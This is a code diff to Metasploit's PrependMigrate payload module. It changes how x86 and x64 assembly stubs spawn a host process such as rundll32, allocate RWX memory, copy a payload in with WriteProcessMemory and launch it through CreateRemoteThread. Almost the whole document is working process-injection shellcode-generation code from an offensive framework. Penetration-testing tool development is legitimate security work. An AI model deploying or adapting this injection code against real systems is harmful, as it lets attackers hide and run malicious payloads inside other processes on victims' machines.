@@ -17,7 +17,7 @@ module Msf::Payload::Windows::PrependMigrate
     register_advanced_options(
       [
         Msf::OptBool.new('PrependMigrate', [ true, "Spawns and runs shellcode in new process", false ]),
-        Msf::OptString.new('PrependMigrateProc', [ false, "Process to spawn and run shellcode in" ])
+        Msf::OptString.new('PrependMigrateProc', [ false, "Process to spawn and run shellcode in" ]),
       ], Msf::Payload::Windows )
     ret
   end
@@ -35,29 +35,26 @@ module Msf::Payload::Windows::PrependMigrate
   # Overload the generate() call to prefix our stubs
   #
   def apply_prepend_migrate(buf)
-    pre = ''
-
     test_arch = [ *(self.arch) ]
 
     if prepend_migrate?
       # Handle all x86 code here
       if test_arch.include?(ARCH_X86)
         migrate_asm = prepend_migrate(buf)
-        pre << Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
+        buf = Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
       # Handle all x64 code here
       elsif test_arch.include?(ARCH_X64)
         migrate_asm = prepend_migrate_64(buf)
-        pre << Metasm::Shellcode.assemble(Metasm::X64.new, migrate_asm).encode_string
+        buf = Metasm::Shellcode.assemble(Metasm::X64.new, migrate_asm).encode_string
       end
     end
-    return pre + buf
+    return buf
   end
 
   #
   # Create assembly
   #
   def prepend_migrate(buf)
-    payloadsize = "0x%04x" % buf.length
     procname = datastore['PrependMigrateProc'] || 'rundll32'
 
     # Prepare instructions to get address of block_api into ebp
@@ -177,7 +174,6 @@ module Msf::Payload::Windows::PrependMigrate
     block_api = Metasm::Shellcode.assemble(Metasm::Ia32.new, block_api_asm).encode_string
     block_api_index = buf.index(block_api)
     if block_api_index
-
       # Prepare instructions to calculate address
       ebp_offset = "0x%04x" % (block_api_index + 5)
       block_api_ebp_asm = <<-EOS
@@ -195,7 +191,7 @@ module Msf::Payload::Windows::PrependMigrate
       EOS
     end
 
-    #put all pieces together
+    # put all pieces together
     migrate_asm = <<-EOS
       cld                       ; Clear the direction flag.
       #{block_api_start}
@@ -248,7 +244,8 @@ module Msf::Payload::Windows::PrependMigrate
       # probably stageless, so we don't have shellcode size constraints,
       # and so we can just set ebx to the size of the payload
       migrate_asm << <<-EOS
-      mov ebx, #{payloadsize} ; stageless size
+      call getpayloadsize
+      mov ebx, eax              ; stageless size
       EOS
     end
 
@@ -260,23 +257,26 @@ module Msf::Payload::Windows::PrependMigrate
       push 0x3F9287AE           ; hash( "kernel32.dll", "VirtualAllocEx" )
       call ebp                  ; VirtualAllocEx( ...);
 
-      ; eax now contains the destination
+      ; eax now contains the destination - save in ebx
+      mov ebx, eax              ; lpBaseAddress
+
       ; WriteProcessMemory()
       push esp                  ; lpNumberOfBytesWritten
-      push #{payloadsize}       ; nSize
-      ; pick up pointer to shellcode & keep it on stack
-      jmp begin_of_payload
-      begin_of_payload_return:  ; lpBuffer
-      push eax                  ; lpBaseAddress
+      call getpayloadsize
+      push eax                  ; nSize
+      call getpayloadstart
+      push eax
+      push ebx                  ; lpBaseAddress
       push [edi]                ; hProcess
       push 0xE7BDD8C5           ; hash( "kernel32.dll", "WriteProcessMemory" )
       call ebp                  ; WriteProcessMemory( ...)
 
       ; run the code (CreateRemoteThread())
+      mov ecx, ebx
+      xor ebx,ebx
       push ebx                  ; lpthreadID
       push ebx                  ; run immediately
       push ebx                  ; no parameter
-      mov ecx,[esp-0x4]
       push ecx                  ; shellcode
       push ebx                  ; stacksize
       push ebx                  ; lpThreadAttributes
@@ -284,23 +284,43 @@ module Msf::Payload::Windows::PrependMigrate
       push 0x799AACC6           ; hash( "kernel32.dll", "CreateRemoteThread" )
       call ebp                  ; CreateRemoteThread( ...);
 
-      #{exitblock}              ; jmp to exitfunc or long sleep
-
     getcommand:
       call gotcommand
       db "#{procname}"
       db 0x00
+
+    getpayloadsize:
+      call getpayloadstart
+      mov ecx, eax
+      call getpayloadend
+      sub eax, ecx
+      ret
+      
+    getpayloadstart:
+      jmp start_of_payload
+      start_of_payload_return:
+      pop eax
+      ret
+
+    getpayloadend:
+      jmp end_of_payload
+      end_of_payload_return:
+      pop eax
+      ret
+
     #{block_close_to_payload}
-    begin_of_payload:
-      call begin_of_payload_return
+    start_of_payload:
+      call start_of_payload_return
     payload:
+      #{asm_payload(buf)}
+    end_of_payload:
+      call end_of_payload_return
     EOS
     migrate_asm
   end
 
 
   def prepend_migrate_64(buf)
-    payloadsize = "0x%04x" % buf.length
     procname = datastore['PrependMigrateProc'] || 'rundll32'
 
     # Prepare instructions to get address of block_api into ebp
@@ -424,7 +444,6 @@ module Msf::Payload::Windows::PrependMigrate
     block_api = Metasm::Shellcode.assemble(Metasm::X64.new, block_api_asm).encode_string
     block_api_index = buf.index(block_api)
     if block_api_index
-
       # Prepare instructions to calculate address
       rbp_offset = "0x%04x" % (block_api_index + 5)
       block_api_rbp_asm = <<-EOS
@@ -485,38 +504,26 @@ module Msf::Payload::Windows::PrependMigrate
       ; allocate memory in the process (VirtualAllocEx())
       ; get handle
       push 0x40                 ; RWX
+      call getpayloadsize
+      mov r8, rax
       mov r9,0x1000             ; 0x1000 = MEM_COMMIT
-    EOS
-
-    if buf.length > 4096
-      # probably stageless, so we don't have shellcode size constraints,
-      # and so we can just set r8 to the size of the payload
-      migrate_asm << <<-EOS
-      mov r8, #{payloadsize} ; stageless size
-      EOS
-    else
-      # otherwise we'll juse reuse r9 (4096) for size
-      migrate_asm << <<-EOS
-      mov r8,r9                 ; size
-      EOS
-    end
-
-    migrate_asm << <<-EOS
       xor rdx,rdx               ; address
       mov rcx, [rdi]            ; handle
       mov r10d, 0x3F9287AE      ; hash( "kernel32.dll", "VirtualAllocEx" )
       call rbp                  ; VirtualAllocEx( ...);
 
-      ; eax now contains the destination - save in ebx
+      ; rax now contains the destination - save in rbx
       mov rbx, rax              ; lpBaseAddress
+
       ; WriteProcessMemory()
       push rsp                  ; lpNumberOfBytesWritten
-      mov r9, #{payloadsize}    ; nSize
+      call getpayloadsize
+      push    rax               ; store nSize
       ; pick up pointer to shellcode & keep it on stack
-      jmp begin_of_payload
-      begin_of_payload_return:
-      pop r8                    ; lpBuffer
-      mov rdx, rax              ; lpBaseAddress
+      call getpayloadstart
+      mov r8, rax               ; lpBuffer
+      pop r9                    ; get nSize
+      mov rdx, rbx              ; lpBaseAddress
       mov rcx, [rdi]            ; hProcess
       mov r10d, 0xE7BDD8C5      ; hash( "kernel32.dll", "WriteProcessMemory" )
       call rbp                  ; WriteProcessMemory( ...);
@@ -526,7 +533,7 @@ module Msf::Payload::Windows::PrependMigrate
       push rcx                  ; lpthreadID
       push rcx                  ; run immediately
       push rcx                  ; no parameter
-      mov r9,rbx                ; shellcode
+      mov r9, rbx               ; shellcode
       mov r8, rcx               ; stacksize
       ;rdx already equals 0     ; lpThreadAttributes
       mov rcx, [rdi]
@@ -539,13 +546,42 @@ module Msf::Payload::Windows::PrependMigrate
       call gotcommand
       db "#{procname}"
       db 0x00
+
+    getpayloadsize:
+      call getpayloadstart
+      mov rcx, rax
+      call getpayloadend
+      sub rax, rcx
+      ret
+      
+    getpayloadstart:
+      jmp start_of_payload
+      start_of_payload_return:
+      pop rax
+      ret
+
+    getpayloadend:
+      jmp end_of_payload
+      end_of_payload_return:
+      pop rax
+      ret
+
     #{block_close_to_payload}
-    begin_of_payload:
-      call begin_of_payload_return
+    start_of_payload:
+      call start_of_payload_return
     payload:
+      #{asm_payload(buf)}
+    end_of_payload:
+      call end_of_payload_return
     EOS
     migrate_asm
   end
 
+  private
+  def asm_payload(buf)
+    Rex::Text.hexify(buf, 20).split("\n").map { |line|
+      "      db 0x#{ line[2..-1].split("\\x").join(', 0x') }"
+    }.join("\n")
+  end
 end
 
